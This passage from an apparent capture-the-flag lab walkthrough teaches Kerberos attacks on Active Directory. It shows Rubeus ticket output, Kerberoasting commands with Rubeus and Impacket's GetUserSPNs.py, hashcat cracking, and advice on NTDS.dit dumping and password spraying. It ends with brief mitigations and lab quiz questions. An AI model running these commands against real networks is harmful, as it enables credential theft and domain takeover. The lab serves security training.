      ooHnBIHkfYHhMIHeoIHbMIHYMIHVoCswKaADAgESoSIEIHPkoLMvwz6hai0xIyJOPErmyVsdHxhiLtxX
      TVcTw5qeoRIbEENPTlRST0xMRVIuTE9DQUyiFTAToAMCAQGhDDAKGwhNYWNoaW5lMaMHAwUAQOEAAKUR
      GA8yMDIwMTEyNDE4MzAyMFqmERgPMjAyMDExMjUwNDMwMjBapxEYDzIwMjAxMjAxMTgzMDIwWqgSGxBD
      T05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEVSLmxvY2Fs



[+] Done
```

Be mindful of how you use this attack as it may lock you out of the network depending on the account lockout policies.

Which domain admin do we get a ticket for when harvesting tickets?

`Administrator`

Which domain controller do we get a ticket for when harvesting tickets?

`CONTROLLER-1`

## Task 4 Kerberoasting w/ Rubeus & Impacket

In this task we'll be covering one of the most popular Kerberos attacks - Kerberoasting. Kerberoasting allows a user to request a service ticket for any service with a registered SPN then use that ticket to crack the service password. If the service has a registered SPN then it can be Kerberoastable however the success of the attack depends on how strong the password is and if it is trackable as well as the privileges of the cracked service account. To enumerate Kerberoastable accounts I would suggest a tool like BloodHound to find all Kerberoastable accounts, it will allow you to see what kind of accounts you can kerberoast if they are domain admins, and what kind of connections they have to the rest of the domain. That is a bit out of scope for this room but it is a great tool for finding accounts to target.

In order to perform the attack, we'll be using both Rubeus as well as Impacket so you understand the various tools out there for Kerberoasting. There are other tools out there such a kekeo and Invoke-Kerberoast but I'll leave you to do your own research on those tools.

I have already taken the time to put Rubeus on the machine for you, it is located in the downloads folder.

**Method 1 - Rubeus**

**Kerberoasting w/ Rubeus -**

1. cd Downloads - navigate to the directory Rubeus is in
2. Rubeus.exe kerberoast This will dump the Kerberos hash of any kerberoastable users

![](https://i.imgur.com/XZegVqf.png)

copy the hash onto your attacker machine and put it into a .txt file so we can crack it with hashcat

I have created a modified rockyou wordlist in order to speed up the process download it [here](https://github.com/Cryilllic/Active-Directory-Wordlists/blob/master/Pass.txt)

3. hashcat -m 13100 -a 0 hash.txt Pass.txt - now crack that hash

Method 2 - Impacket

Impacket Installation -

Impacket releases have been unstable since 0.9.20 I suggest getting an installation of Impacket < 0.9.20

1.) cd /opt navigate to your preferred directory to save tools in

2.) download the precompiled package from https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_19

3.) cd Impacket-0.9.19 navigate to the impacket directory

4.) pip install . - this will install all needed dependencies

Kerberoasting w/ Impacket -

1.) cd /usr/share/doc/python3-impacket/examples/ - navigate to where GetUserSPNs.py is located

2.) sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.197.112 -request - this will dump the Kerberos hash for all kerberoastable accounts it can find on the target domain just like Rubeus does; however, this does not have to be on the targets machine and can be done remotely.

3.) hashcat -m 13100 -a 0 hash.txt Pass.txt - now crack that hash

What Can a Service Account do?

After cracking the service account password there are various ways of exfiltrating data or collecting loot depending on whether the service account is a domain admin or not. If the service account is a domain admin you have control similar to that of a golden/silver ticket and can now gather loot such as dumping the NTDS.dit. If the service account is not a domain admin you can use it to log into other systems and pivot or escalate or you can use that cracked password to spray against other service and domain admin accounts; many companies may reuse the same or similar passwords for their service or domain admin users. If you are in a professional pen test be aware of how the company wants you to show risk most of the time they don't want you to exfiltrate data and will set a goal or process for you to get in order to show risk inside of the assessment.

Mitigation - Defending the Forest

Kerberoasting Mitigation -

     Strong Service Passwords - If the service account passwords are strong then kerberoasting will be ineffective
     Don't Make Service Accounts Domain Admins - Service accounts don't need to be domain admins, kerberoasting won't be as effective if you don't make service accounts domain admins.

What is the HTTPService Password?

What is the SQLService Password?

## Task 5 AS-REP Roasting w/ Rubeus

## Task 6 Pass the Ticket w/ mimikatz

## Task 7 Golden/Silver Ticket Attacks w/ mimikatz

## Task 8 Kerberos Backdoors w/ mimikatz

## Task 9 Conclusion
